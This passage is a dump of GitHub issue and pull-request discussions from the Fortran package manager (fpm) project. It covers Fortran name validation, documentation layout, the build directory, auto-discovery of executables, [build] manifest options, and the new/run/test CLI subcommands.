                    "text": "I happen to have an example for the VERIFY(3f) intrinsic\nprogram demo_verify\nimplicit none\ncharacter(len=64)  :: line\ninteger            :: ios\n   do\n      read(*,'(a)',iostat=ios) line\n      if(ios.ne.0) exit\n      if( fortran_name(line) )then\n         write(*,*)trim(line),' passed'\n      else\n         write(*,*)trim(line),' failed'\n      endif\n   enddo\ncontains\nfunction fortran_name(line) result (lout)\n! determine if a string is a valid Fortran name ignoring trailing spaces (but not leading spaces)\ncharacter(len=*),parameter   :: int='0123456789'\ncharacter(len=*),parameter   :: lower='abcdefghijklmnopqrstuvwxyz'\ncharacter(len=*),parameter   :: upper='ABCDEFGHIJKLMNOPQRSTUVWXYZ'\ncharacter(len=*),parameter   :: allowed=upper//lower//int//'_'\ncharacter(len=*),intent(in)  :: line\ncharacter(len=:),allocatable :: name\nlogical                      :: lout\n   name=trim(line)\n   if(len(name).ne.0)then\n      lout = .true.                                  &\n       & .and. verify(name(1:1), lower//upper) == 0  &\n       & .and. verify(name,allowed) == 0             &\n       & .and. len(name) <= 63\n   else\n      lout = .false.\n   endif\nend function fortran_name\nend program demo_verify\nThat I could put in put in fpm_strings.f90 if the preference is 1) , Not sure why I have the redundant \".true.\" in there, but I would take that out."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-28 10:50:26+00:00",
                    "text": "I would support method 1) as the way to handle this problem.\nThere is actually already a fortran name validation function buried in fpm_sources.f90:\n\n  \n    \n      fpm/fpm/src/fpm_sources.f90\n    \n    \n        Lines 405 to 439\n      in\n      90ddc6f\n    \n    \n    \n    \n\n        \n          \n           function validate_name(name) result(valid) \n        \n\n        \n          \n               character(*), intent(in) :: name \n        \n\n        \n          \n               logical :: valid \n        \n\n        \n          \n            \n        \n\n        \n          \n               integer :: i \n        \n\n        \n          \n            \n        \n\n        \n          \n               if (len_trim(name) < 1) then \n        \n\n        \n          \n                   valid = .false. \n        \n\n        \n          \n                   return \n        \n\n        \n          \n               end if \n        \n\n        \n          \n            \n        \n\n        \n          \n               if (lower(name(1:1)) < 'a' .or. & \n        \n\n        \n          \n                   lower(name(1:1)) > 'z') then \n        \n\n        \n          \n            \n        \n\n        \n          \n                   valid = .false. \n        \n\n        \n          \n                   return \n        \n\n        \n          \n               end if \n        \n\n        \n          \n            \n        \n\n        \n          \n               do i=1,len(name) \n        \n\n        \n          \n            \n        \n\n        \n          \n                   if (.not.( & \n        \n\n        \n          \n                       (name(i:i) >= '0' .and. name(i:i) <= '9').or. & \n        \n\n        \n          \n                       (lower(name(i:i)) >= 'a' .and. lower(name(i:i)) <= 'z').or. & \n        \n\n        \n          \n                       name(i:i) == '_') ) then \n        \n\n        \n          \n                            \n        \n\n        \n          \n                       valid = .false. \n        \n\n        \n          \n                       return \n        \n\n        \n          \n                   end if \n        \n\n        \n          \n            \n        \n\n        \n          \n               end do \n        \n\n        \n          \n            \n        \n\n        \n          \n               valid = .true. \n        \n\n        \n          \n               return \n        \n\n        \n          \n            \n        \n\n        \n          \n           end function validate_name \n        \n    \n  \n\n\nThough this implementation is not as elegant as yours @urbanjost, so would support replacing it with yours if/when you put it in fpm_strings.f90."
                },
                {
                    "user": "certik",
                    "date": "2020-09-28 15:26:00+00:00",
                    "text": "I would reject names that are not valid Fortran program names.\nLater, we can relax this restriction in various ways if there is demand."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-29 01:41:18+00:00",
                    "text": "IThanks; but right now I want to change as few files as possible until things catch up. I was just going to put your routine into the strings library as it is actually likely faster and mine was just a demo I made for someone to show them how VERIFY could be used, which is not intuitively obvious to a lot of peope, apparently. So I just used mine directly in the fpm_command_line.f90 file for now If the NEW PR gets accepted I will move one to the fpm_strings.f90 so we can both use it if no one beats me to it, but I would like to see master updated first and then that can just be a simple stand-alone PR that should be easily reviewable/merged. I have too many little changes in NEW already, I think. Hoping this is acceptable and  can be merged. Please review and let me know what needs changed!"
                }
            ]
        },
        {
            "number": 195,
            "user": "urbanjost",
            "date": "2020-09-27 20:43:31+00:00",
            "title": "should the default layout include a recommended structure for a doc/ directory?",
            "text": "I have not seen much definition of it but I have seen several references to a --install option for fpm(1). I assume that at a minimum that will copy executables and object and *.mod files to user-specified areas and perhaps a \"standard\" area for fpm(1) packages.  If that is the case it would be typical to install at least some kinds of documenation. On Linux systems that often is the /usr/share area.  So should some recommendation or creation of an area like doc/ be created and or man/ or html/?  Github has specific preferences for the name and content type of documentation, but of course it is only one of many forums. If there is no rules specified for what an --install will do with documention I am afraid it will be \"left behind\" when an install occurs. That also applies to dependencies. Currently if I use a number of remote dependencies in a project I have to manually look through the build directory to see if there is any documentation supplied with the package.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-28 15:46:51+00:00",
                    "text": "I think it's a good idea to standardize something for documentation. Cargo for example automatically generates documentation for a Cargo package.\nDown the road once we have a documentation generator, we can simply use it, like Cargo does.\nWe can also standardize where to put linux man pages if there is interest."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-28 20:03:00+00:00",
                    "text": "Manpages are one issue, they can either be in roff already or be in some format, like asciidoc, which has to be translated with the correct tool first. fpm should know what a manpage is and how it must be placed on install ($PREFIX/share/man/man<id>). On default fpm could search for a man directory and attempt to translate any adoc file using asciidoctor and than install all roff files, both generated and found. Maybe supporting a section like this in the fpm.toml\n[documentation]\n[documentation.manpages]\ninclude = \"man\"\ntool = \"asciidoctor\"\ncompress = true  # compress with gz\nHTML documentation might be generated with ford, doxygen, ..., there are a lot of tools out there, not sure if there is a way to easily support them in a generic way or to detect them. It should not be shipped by default, since it can be rather large."
                },
                {
                    "user": "certik",
                    "date": "2020-09-29 16:45:45+00:00",
                    "text": "Distribution in general (even of asciidoctor) will be an issue. We will figure it out eventually, either by creating fpm packages for those, or once fpm can interface Conda and other package managers, it can install those via them. Until then, we can at least experiment with designs, perhaps even optionally using asciidoctor and other tools if they are present, and skipping the doc build if they are not present."
                }
            ]
        },
        {
            "number": 194,
            "user": "urbanjost",
            "date": "2020-09-27 20:33:58+00:00",
            "title": "Should the build/ directory be a hidden directory?",
            "text": "If a goal of fpm(1) is that the user should not have to interact directly with anything in the build directory I would prefer it be a hidden directory like \".git\" for git(1) users. But I see other package managers use the build/ directory more like a scratch area\nthat contains things like log files from a build or test that users are expected to interact with. So I would alter my preference\nif that is the case. So my suggestion to change build/ to ./build hinges on things like\n\nshould there be a build/log file and should the \"build\" and \"test\" commands always write their output there?\nis the intent that a user need not and should not know anything about the structure of the build/ directory?\n\nin a related vein I think it should be explicitly stated in the documentation that everything fpm(1) creates is in the build directory and that it can be freely deleted and recreated with a subsequent build command assuming that remote dependencies are available. When I first installed fpm(1) it was not clear to me whether I could or should alter the build directory.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 21:04:23+00:00",
                    "text": "I'm not opposed to making the build directory hidden. I believe Haskell's Stack does that. It certainly makes it clearer that users aren't intended to be looking in there. But if we start putting log files in there, users wouldn't necessarily find them. (Maybe that would be intentional though?)\nI agree that we should make it clear that it is safe to delete the build directory in the documentation, but also that users shouldn't modify anything in there. We've listed it in .gitignore for new projects, but that doesn't necessarily make it clear to everybody."
                }
            ]
        },
        {
            "number": 193,
            "user": "LKedward",
            "date": "2020-09-27 12:19:52+00:00",
            "title": "Local path and remote git dependencies",
            "text": "Adds support for local path dependencies and remote git dependencies\n\n\nFortran fpm can now build the hello_fpm, circular_test and circular_example example packages",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-28 15:23:49+00:00",
                    "text": "This looks great.  Thanks!\nLet's finish #190 soon, so that we can build upon it."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-20 09:45:23+00:00",
                    "text": "Many thanks for the reviews - with three approvals I will merge later today if there are no objections."
                }
            ]
        },
        {
            "number": 192,
            "user": "urbanjost",
            "date": "2020-09-26 16:38:13+00:00",
            "title": "Should files created by \"fpm new\" only be placeholders or more substantive?",
            "text": "When you run \"fpm new\" it creates placeholder files. They are essentially \"hello world\" examples. That keeps it simple but I was wondering if a more substantive file might be useful, especially for programmers new to Fortran or unit testing. Maybe a link to the stdlib logging/testing topics in a WRITE statement, ...\nBut thinking of something like the following:\nprogram main\nimplicit none\ninteger                    :: A = 10,  B = 20,  C = 30,  i\nlogical,allocatable        :: tally(:)\nlogical                    :: allpassed = .true.\ncharacter(len=*),parameter :: gen = \"(*(g0:, 1x))\"\ncharacter(len=*),parameter :: fancy = \"(a, *(\"\"[\"\"g0,\"\":\"\",g0,\"\"]\"\":))\"\n   write(*,\"(a)\")\"SAMPLE TEST PROGRAM - Put some real tests in here!\"\n   ! determine if a group of tests all pass\n   allpassed = allpassed .and. a < b .and. b < c\n   allpassed = allpassed .and. annotate( \"IS A.LT.B?\", a < b )\n   allpassed = allpassed .and. annotate( \"IS B.LT.C?\", b < c )\n   allpassed = allpassed .and. annotate( \"IS A.LT.C?\", a < c )\n   write(*,\"(a)\")merge(\"EVERYTHING PASSED\",\"SOMETHING FAILED \",allpassed)\n   ! append results of tests into TALLY\n   tally = [ logical :: ]\n   tally = [ tally, a < b ]\n   tally = [ tally, c < b ]\n   tally = [ tally, b < c .and. a < c ]\n   ! show test results\n   write(*, fmt=fancy)\"testing tally=\", (i, tally(i), i = 1, size(tally))\n   if( all(tally) )then\n      write(*, gen)\"PASSED: all\", size(tally), \"tests passed\"\n   else\n      write(*, gen)\"FAILED: out of\", size(tally), \"tests\",   &\n       & count(.not.tally), \"failed and\", count(tally), \"passed\"\n   endif\ncontains\n   function annotate(msg, tst)\n   character(len=*),intent(in) :: msg\n   logical,intent(in)          :: tst\n   logical                     :: annotate\n      annotate=tst\n      write(*, \"(a,1x,l1)\" )msg,tst\n   end function annotate\nend program main\nJust throwing the thought out there.  Maybe the README.md file could have something in it too, like:\nThis project uses the Fortran Package Manager\nThe home page for fpm(1) is\nhttp://github.com/fortran-lang/fpm\nRegistered fpm(1) packages can be found at\nhttp://fortran-lang.org/packages/\nDiscuss Fortran at\nhttps://fortran-lang.discourse.group/latest\nContribute to the Fortran Standard Library at\nhttps://github.com/fortran-lang/stdlib\nFind this and more at the Fortran Language page\nBut markdown is not exactly portable, so not sure links would always work and user might not even be usiing a web repository",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-26 17:13:49+00:00",
                    "text": "I like the idea of a more elaborate README. Advertising resources for Fortran might be interesting, maybe more helpful would be a short introduction on fpm, from building over running tests to finally installing the project, if it is well written, it might stay in the README of the finally published project as building instructions.\nAs for the scaffold of the executable or library, the less the better, chances that an example code will fit the users project are rather small, in my opinion.\nBut I can see, that giving fpm the capability to work as a cookiecutter for creating a new project, when giving the correct template, could reduce some repetitive work. Maybe we could allow fpm to create a new project from a template repository."
                }
            ]
        },
        {
            "number": 191,
            "user": "awvwgk",
            "date": "2020-09-26 12:58:17+00:00",
            "title": "Package options in fpm.toml",
            "text": "Came up in #190 and disabling/enabling the auto discovery features.\nGenerally, we need a way to customize fpm per package, as a first suggestion for the auto discovery:\n[build]  # or config, ...\nauto-executables = true\nauto-tests = false\nThe fpm-options could include other information as well, like\n[build]\nfast-math = false  # don't use -ffast-math\nstandard = \"2008\"\npreprocessor = \"fypp\"\nThere are two major questions here\n\nWhich table should hold options to customize fpm per package?\n\nmanifest root, [build], [config], ...\n\n\nWhich options do want to include in this section?\n\nauto-discovery, standard, preprocessor, compiler flags, ...",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-26 17:05:57+00:00",
                    "text": "I prefer [build] over [config] as the table name since it's more descriptive. We could also include an option to turn-on link-time optimization (LTO). I'm not sure about preprocessor as a global option - I'd assumed that we'd be able to determine if a source needs a particular  preprocessor based on file extension? This would allow both fypp and cpp to be used in the same project.\nFor compiler/linker flags it would be useful to have two options for either appending to or overriding built-in flags, e.g.:\nfflags-extra       # Append to fortran compiler flags\nfflags             # Override fortran compiler flags\ncflags               \ncflags-extra\nlflags\nlflags-extra"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-26 18:59:40+00:00",
                    "text": "I'd assumed that we'd be able to determine if a source needs a particular preprocessor based on file extension?\n\nThe relevant issue should be #78 for this discussion. The conclusion seems to be that supporting both is necessary. I think fypp and cpp should be mutually exclusive on per project basis, since both would probably use .F90 as file extension. We could search for .fypp macro files, but a project can use fypp without defining those.\nI think, we have yet to establish a best practise on preprocessor usage with fpm."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 20:47:21+00:00",
                    "text": "I think this will almost certainly be necessary, and I like [build] as the table. I think each option/entry in the table will need it's own discussion, but one thing I think each will need to answer is: How are the precedence or combinations of options handled during the building of dependencies?\nAs an example (and I'm certain there will be others for which the answer may be different), if a package specifies fast-math = false, but it has a dependency that specifies fast-math = true, is that dependency built with or without fast math? Presumably that dependency isn't doing anything for which fast math would cause issues, and it would still be safe to compile it with fast math, and compile the main package without. But then what about the reverse scenario? Is that still safe?\nBut we should probably just save those discussions for each specific option."
                },
                {
                    "user": "certik",
                    "date": "2020-09-28 15:14:52+00:00",
                    "text": "Depending on what exactly ends up in [build], the other option to use is [package] or [fpm]. I think [build] is fine for stuff like compiler options or fast-math. For auto discovery my first inclination was to use a section [fpm]. But [build] is fine with me also, so let's go with that.\nI think fast-math is tricky, I think one approach is:\n\n\nthere is a flag that specifies if a given package works with fast math. We can discuss if this flag should be on by default, the safe is off by default. This flag can be called fast-math. This is the only flag that you specify in fpm.toml.\n\n\nWhen the user uses fpm to build an app, it can specify options on the command line such as fast-math. By default this fast-math option can be on. If this option is on, fpm will check all dependencies, and if they all have their fast-math flag on, it will build everything with fast-math. If even one of them has this flag off, it will build everything with fast-math off. This is the safest approach that will work.\n\n\nMore advanced approach is to mix and match fast-math in dependencies, and my experience is that it doesn't always work, because fast-math enables various CPU hardware options (such as disabling denormal numbers) which screws things up for code that does not work with fast-math. As such, I would recommend the safe approach above."
                }
            ]
        },
        {
            "number": 190,
            "user": "LKedward",
            "date": "2020-09-26 10:43:53+00:00",
            "title": "Auto discovery of executables",
            "text": "Set of changes to address #164 as discussed there.\n\n\nRemoves filtering out of executables/tests not specified in the manifest; this allows all programs found in app/ and test/ directories (and subdirectories) into the package model.\n\n\nDoes not affect existing behaviour of [[executable]] and [[test]] entries in manifest:\n\nCan still specify non-default layouts with these entries;\nCan override individual settings for auto-discovered executables.\n\n\n\nAdds a 'scope' to each source, based on source file location, to control which modules can be used within:\n\nLibrary modules (from src/) can only use other library modules or modules from dependencies;\nPrograms and modules in app/ and test/ can use library modules and any modules defined in the same directory as the executable/test;\nLibrary modules cannot use modules in app/ or test/;\nModule dependency resolution fails fatally if a source file cannot be found for a use statement that satisfies these scoping rules.\n\n\n\nAdds a new example demonstrating:\n\nAutomatic discovery of programs/tests;\nOverriding of a discovered executable name in manifest;\nModules in same directory as apps and tests.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-26 12:12:36+00:00",
                    "text": "This looks like a useful addition, therefore apologies for the next question: How do you turn it off?\nCargo can disable those by: https://doc.rust-lang.org/cargo/reference/cargo-targets.html#target-auto-discovery"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-26 12:25:17+00:00",
                    "text": "How do you turn it off?\n\nFair question. I haven't implemented a way to disable it yet but agree that it is needed.\nWhat manifest syntax would you suggest? Would you prefer this to be included in this PR or a separate one?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-26 12:44:11+00:00",
                    "text": "What manifest syntax would you suggest?\n\nIn Cargo it is top-level (meaning [package] which is top-level in fpm).\nBut maybe a separate section in the fpm.toml is preferable:\n[build]  # or config, ...\nauto-tests = false\nauto-executables = false\nNaming would be important, since this is going to be the section holding all the build configuration rules later, I guess.\n\nWould you prefer this to be included in this PR or a separate one?\n\nThe syntax will need a bit of discussion first, might be worth deferring than.\nEdit: Let's discuss this in a separate issue: #191"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-28 03:20:57+00:00",
                    "text": "]So if you have multiple test programs that all shared a module either in the test directory or specified by [test.dependencies]\nthat you did not need to be used by anything but the test programs (a common case for me where I have a module essentially just used for unit tests)?  It sounds like I would not have to put the programs in seperate subdirectories and that I could put everything directly in test?  If I wanted to have each test in a subdirectory would I have to have the test module in each subdirectory as well?  I am being lazy in that I could look at the code but I am not positive in the discussions whether the term \"directory\" is being used to mean the top directories app/, test/ and src/ or the subdirectories currently required in h-fpm for each executable."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-28 08:34:32+00:00",
                    "text": "@urbanjost, yes your understanding is correct: in this PR you no longer need separate subdirectories in app/ or test/ for multiple executables and tests and you no longer need to specify each test and executable in fpm.toml. You can still use subdirectories but as you point out you can't share modules easily between executables in different subdirectories, so in this case I would recommend using [test.dependencies] instead."
                },
                {
                    "user": "certik",
                    "date": "2020-09-28 15:16:40+00:00",
                    "text": "This looks awesome. Why don't you implement the following:\n[build]\nauto-tests = false\nauto-executables = false\n\nAnd add a test for it.\nThen this PR will be ready to merge. In the meantime, we will come up with some way to move forward in #191, and if we end up with different names, it's easy to rename in this PR."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-29 12:53:09+00:00",
                    "text": "Thanks for the explanation @awvwgk, that makes sense. Changes applied."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-29 13:04:24+00:00",
                    "text": "Nice work on the batch commit for suggested changes. Sorry for pointing out now that the build_config doesn't have to be allocatable anymore."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-02 21:04:54+00:00",
                    "text": "was going to ask about a use for an intrinsic module, but guess it is just easier to try it now."
                }
            ]
        },
        {
            "number": 189,
            "user": "urbanjost",
            "date": "2020-09-24 06:37:48+00:00",
            "title": "Pull request for NEW",
            "text": "sort out branches\nadd test program for CLI\nfix fpm.toml version reference\nremove --usage references from help text\nbasic RUN subcommand\nremove dash from executable name to see if it clears MSWindows build error\ntry one more like previous build to clear error\nbuild on proposed CLI interface to make a \"new\" and \"run\" subcommand for discussion\nbasic new,test,run added to build subcommands\nchange quoting of -- ARGS values for more platform independence and change test accordingly\nreplace cli_test test\nconsistent indenting\nerrata for NEW PR\nremove doc",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-28 15:21:19+00:00",
                    "text": "There is some failure on Windows. Otherwise this looks good."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-29 01:15:39+00:00",
                    "text": "All tests pass now. I have built, run, and tested 17 packages built with h-fpm with this version of f-fpm. I think the changes to the fpm_command_line.f90 are self-contained and straight-forward to review, and well as the \"new\" subcommand. I just utilized the existing functionality in \"build\" to implement \"run\" and \"test\".  The --list extension, the alternate --lib --test --app for --with-executable and --with-test and whether they should replace the --with-* options and what the default should be for \"fpm new\" and the new routine to find default test files are the main parts I am looking for affirmation on. The build/search/dependency is great and I am trying some Fortran/C projects that required fpm.mk files look like they will work with the new code; quite significant compared to what I hope are relatively minor changes I am proposing here. I look forward to everyone's review. Everyone has come a long way towards making a package that can just require gfortran and git and maybe ar and libcurl or OS-specific equivalents for ar.  Although the main focus here is to make a package manager I am starting to get excited that this can also be used on a stand-alone system for a new Fortran programmer. It would be nice for a novice to not have to learn Make/CMake/... and ar and what switches to use on a compiler for debugging and production before they can gt very far with Fortran; and still be useable by someone that does know those things. Lots of things to resolve but I am getting excited that the day I want to make a program with command-line cracking, date and time functions, regular expressions, ... and a plethora of mathematical functions could be trivial. Historically Fortran programmers don't play well together. I have seen a lot of activity lately that shows this is changing and fpm(1) and stdlib really does seem like they could be the missing pieces that finally change this (only took sixty years)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-29 14:29:08+00:00",
                    "text": "Thanks a lot, @urbanjost, I will play with it today."
                },
                {
                    "user": "certik",
                    "date": "2020-09-29 16:41:50+00:00",
                    "text": "Can you please use 4 spaces to be consistent? Or 2 if you must, but based on our survey, almost nobody prefers 3 spaces."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-30 00:32:40+00:00",
                    "text": "Interesting. The most common indent I see I and I have many millions of lines of code is three; and quite a few auto-formatters defaulted to three last I looked.  I did not see many votes on that so I think the sample size was too small. In general even python which uses indenting to control logic flow does not care about indenting except that it is there or is not. I liked the conclusion I that that came to that code could be run through a specific auto-indenter but have not seen that emerge. Changing the indenting would cause a lot of changes just based on white-space which other arguments here say is undesirable so I am torn here. If I run the whole thing through findent(1) for example it triggers a lot of changes here. I thought there were options in git to ignore white-space differences but must be mistaken. I was going to suggest that be turned on but I guess that was a false memory. Has there been any progress on an automatic reformatter?  I saw the discussion on LFortran possibly doing that. Since I assume that would be based on a fully parsed source that could be much more flexible than most typical reformatters that usually work on a line-by-line basis with some basic split/join capacity."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-30 02:05:32+00:00",
                    "text": "Instead of dealing with the white-space issues piece-meal I ran the fpm.f90 and fpm_command_line.f90 files through a formatter for a one-time\n(hopefully) pass to get it consistent, as there have been multiple authors and styles used in these files. The other changes were applied except for resolving if there is a benefit or standard for use of the STOP statement. In a prototype there are pros and cons to what a STOP statement does."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-30 13:39:49+00:00",
                    "text": "My opinion on the stop and error stop statements is that error stop should be reserved for things that would be indicative of a programming/logic bug. I.e. in the case default of a select case block. These bugs would then (hopefully) be found in development and testing, and the stack trace could be useful.\nFor any other errors the procedure should not stop the program. It should return the error to the caller in some way. Exactly how and in what form, and how sophisticated that is can be open for discussion, but it should probably be done consistently throughout the project.\nThis is so we can unit test such procedures. They're expected to encounter these errors (or you wouldn't have written the code to check for them in the first place) and therefore should be tested to handle those errors properly.\nThere are basically two designs one could use for this:\n\nany procedure that does error handling has an intent(out) argument for returning any error(s) or (for functions) the return type is one that can contain the error(s)\nany procedure that does error handling has an intent(in) argument of class(error_handler_t) with error handling TBPs that can be \"mocked\" in tests to prevent the unit tests from actually stopping and ensure that the appropriate error handling procedure was in fact called.\n\nI generally prefer option 1, as all my procedures can then be pure, but it does have the drawback of sometimes leading to \"noisy\" code as one must always explicitly check the return value for errors."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-30 13:44:58+00:00",
                    "text": "Also FYI, from the standard:\n\nAccording to this document, the following are processor dependent:\n...\nwhether the processor supports a concept of process exit status, and if so, the process exit status on program\ntermination (5.3.7)\n\nSo there is no \"standard\" way of specifying the exit status of a program, and thus one should not rely on it. Obviously a tool like fpm should endeavor to provide a meaningful exit status, but our code and tests shouldn't rely on it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-30 15:45:25+00:00",
                    "text": "@everythingfunctional Minor nit-pick: There is a standard way do it. it's stop [code] and error stop [code] (Section 11.4). What the standard doesn't promise is whether the OS or compiler support process exit codes (exactly your quote). But they can be set/specified in a standard-conforming way. So the question is really whether the OSs we target support process exit codes. I think they do and this could be safely relied on. Otherwise I agree with your recommendation to return the error to the caller rather than stopping.\n(Edit: This may very well be what you meant and if so, please ignore my nit-pick :))"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-30 16:29:35+00:00",
                    "text": "It's an important subtle detail that was worth pointing out. It doesn't really change the recommendation though, limit the places that stop is explicitly called to a sectioned off, explicit error handling part of the code so the rest of the codebase doesn't rely on it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-30 16:43:22+00:00",
                    "text": "Thank you for the hard work @urbanjost. I played with it and am overall happy with the fpm new behavior. I very much appreciate your addition of fpm <command> --help outputs. I also did a cursory read through of the new code. Here are my suggestions:\n\nIn src/fpm_command_line.f90, rename fortran_name() to is_fortran_name(). Rationale: The function returns a logical, so the function name should reflect that.\nfpm --help output ends with \"displayed help text\". I assume \"displayed help text\" is a temporary output for development, so let's remove it.\nAlso, fpm --help ends with \"STOP 1\". I think fpm --help should return normally (from the end program) statement, and not from stop 1, as recommended by the standard. In other words fpm --help should not trigger an erroneous exit.\nfpm --version outputs something like:\n\n$ fpm --version\nVERSION:     0.1.0, Pre-alpha\nPROGRAM:     fpm(1)\nDESCRIPTION: A Fortran package manager and build system\nHOME PAGE:   https://github.com/fortran-lang/fpm\nLICENSE:     MIT\n\ndisplayed version text\nSTOP 3\n\nI find the key words a bit loud. Can we make them lowercase? Also, fpm --version should not return with a non-zero code IMO. Also, flip the order of Program and Version, so finally we get:\n$ ffpm --version\nVersion:     0.1.0, Pre-alpha\nProgram:     fpm(1)\nDescription: A Fortran package manager and build system\nHome page:   https://github.com/fortran-lang/fpm\nLicense:     MIT\n\nI think this is all for now. If there's more I will write, but otherwise I'm mostly happy with this PR. We can smooth out the rough corners in future PRs."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-30 16:51:06+00:00",
                    "text": "Regarding the indentation level discussion, I don't really care which indentation width is most common in the wild. What I care the most is consistency with existing code in this project. So I think a good rule of thumb is, if you're adding code to a module, just follow the style of that module (be it 2 or 4 spaces). I appreciate you making the indentation changes so the new code is consistent with the old. If you're starting a new module, sure, try to be consistent with the other modules, but I doubt anybody would get upset over 3-spaces. After all, 3 spaces are the closest to being most consistent with both 2 and 4 spaces. :)\nIn fpm we currently have a mix of 2- and 4-space indentation, and a mix of indent vs. don't indent the program unit bodies. It's okay. These things will sort themselves out naturally in the long run, and if they don't, it just means it doesn't matter all that much. In the meantime, we simply make a common sense best effort to be mostly consistent."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-01 05:29:14+00:00",
                    "text": "This should bring it up to date except for items that I think should be left as separate PRs and issues. The refactoring of fpm.f90 into individual pieces seems worth looking at as the run and test subcommands are fleshed out, but the original scope was to implement the new subcommand. The build command has progressed rapidly in the meantime and feature creep is getting to the point where I think it is easier to make the refactoring a separate PR so the other commands remain in sync; after which there are a good number of issues with new and the CLI that can be addressed much more cleanly. A more flexible treatment of STOP throughout the project and perhaps the stdlib project is a bigger scope than was intended here and deserves an issue of its own. I think this addresses everything else specific to new that should not be discussed as a separate issue first.\nObviously this depends on everyone's review and after looking at other package managers I have several further proposals for *new myself."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-01 12:43:40+00:00",
                    "text": "The doc/ directory can be deleted. My old personal build system has some automatic document building capabilities that convert files ending in .man to manpages using txt2man(1) and then use groff(1)  or man2html(1) and tidy(1) to generate html. I was running ccall and h-fpm and f-fpm on all the packages listed in the fpm registry and ccall triggered on the scratch *.man pages I made from testing the help.  Those binary files are compressed *roff files which is the standard input for man(1).\nSince they were there I thought they might be useful for reviwing the help text with nicer formatting but on second thought they are a confusion."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-02 14:54:10+00:00",
                    "text": "refreshed with a new pull and repaired that file and no more git errors.  @awvwgk could you verify?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-10-02 19:30:27+00:00",
                    "text": "It builds and runs okay on my end."
                }
            ]
        },
        {
            "number": 188,
            "user": "urbanjost",
            "date": "2020-09-23 02:42:50+00:00",
            "title": "implement basic run subcommand in Fortran fpm",
            "text": "Looking at the subcommand \"build\" and just following that as a model I think I can make a functioning \"run\" subcommand for the Fortran fpm if the CLI is in place. I would like to give that a try, as I do not see that listed anywhere. If that works I believe the \"test\" subcommand would b virtually identical except it would use the test names instead of the executable names.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-23 14:23:28+00:00",
                    "text": "That would be great. One quick note about a subtle difference between run and test, run should call build to make sure everything is up to date, which does not necessarily need to fetch or build the dev-dependencies or the tests. However, test does need to make sure that build does do that first. I think so far we are missing the --test switch for the build command that would signify this behavior for that command."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-26 16:16:24+00:00",
                    "text": "I new build was being called from run and test, but in the version so far I have left build as-is for the most part so for now the run and test commands just have a placeholder. The build in the version I was expanding upon seems to unconditionally when called. The build of course is the core,  but I was not trying to tackle that till the CLI/new/run/test commands were in place. To match what is in the Haskell fpm it needs to do quite a bit more and is doing a few things that might be intentional or might not be. The *.o files are built with the original file prefix intact -- if name.f90 is built name.f90.o is output; but I have seen this done intentionally to avoid collisions between Fortran and C files of the same basename; the Haskell version builds seperate programs in seperate directories but this one puts everything in the app directory. Not sure if that is an intentional refactoring or needs expanded and so on. So I had too many questions about that and skipped calling it automatically. Considering what you say here I should at least call it if the executable does not exist; so it would be created if not updated. I will make that change and as soon as \"build\" is complete at least for files local to the project directory I think it will be a one-line change to call it unconditionally."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-26 16:51:04+00:00",
                    "text": "Your proposed solution to call build when the app/test doesn't exist seems reasonable until conditional compilation is implemented in build. Matching Haskell fpm behaviour with respect to object files doesn't seem to be a necessary goal."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 00:55:39+00:00",
                    "text": "Changed the PR to call build if executable does not exist with a command that that is temporary. I had made an earlier model that emulated the Haskell version partly because that then gave me existing packages to test against and a pass/fail criteria that it generated the same files.  But the build routine has been expanded since then, and when I call it in some of the existing Haskell fpm packages it fails, but I am not sure if that is intentional or not. Everything goes into app/ and test/ instead of specific directories that mirror the input file path name for example. But I see several other discussions about redoing how files are automatically discovered and how the build/ directory might be restructured and it is not clear to me as to what should be changed so\n\nshould the Fortran fpm be compatible with the Haskell fpm in that it can build any current H-fpm package\nshould the generated files all go into the directories they are currently placed in?\nSo the problem is that as-is a bunch of current fpm packages I have to not build. The gfortran command being built could probably be changed to correct for where the files ARE going, or the files can be re-arranged to go where they do in the Haskell version, which would also change the gfortran command.  It is essentially unclear which way the community plans on this going so I think I am stuck at this point until/if the CLI interface is merged and then the same for this one, and I am not sure when/if that is happening.  So is there a functional spec anywhere that says what F-fpm will do? I wanted to look at whether a topological sort of the build files is reasonable to do in fortran to get the right compile order or if that is already in the current build and I missed it ( I haven't gotten through understanding all of it yet). So I think I am basically frozen at this point (waiting for Gadot).  This will create the same files H-fpm does for the \"new\" command and \"build\", \"run\", and \"test\" it robustly 